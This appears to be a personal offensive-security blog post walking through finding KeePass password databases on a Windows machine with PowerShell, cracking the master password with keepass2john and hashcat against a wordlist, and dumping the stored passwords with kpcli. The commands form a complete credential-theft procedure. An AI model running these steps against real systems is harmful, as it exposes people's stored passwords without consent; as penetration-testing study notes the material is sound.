---
layout: post
title: Windows Password Managers
titledate: 09/11/23
tags: ["infosec","offsec", "password"]
---

we can crack windows password manager database hashes

if the user uses a manager like keypass we can do a search to see what extension is being used to store the passwords in the database

then use powershell to search for it

    PS> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

    PS> Get-ChildItem -Path "C:\Users\jim" -Filter *.kdbx -r | % { $_.Name.Replace( ".kdbx","") }

we can use john the ripper's keeppass2john script to format the database

    $ keepass2john Database.kdbx > keepass.hash

john the ripper adds the username Database to the keepass hash file but we will use hashcat so we can remove this

to show the correct mode of hashcat to use 

    $ hashcat --help | grep -i "KeePass"

displays 13400 for keepass

and finally crack it

    $ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

now we use kpcli to view Databse contents

    $ kpcli --kdb=Database.kdbx

enter password from Database.kdx crack
    
and to show passwords

    $ show 1 -f
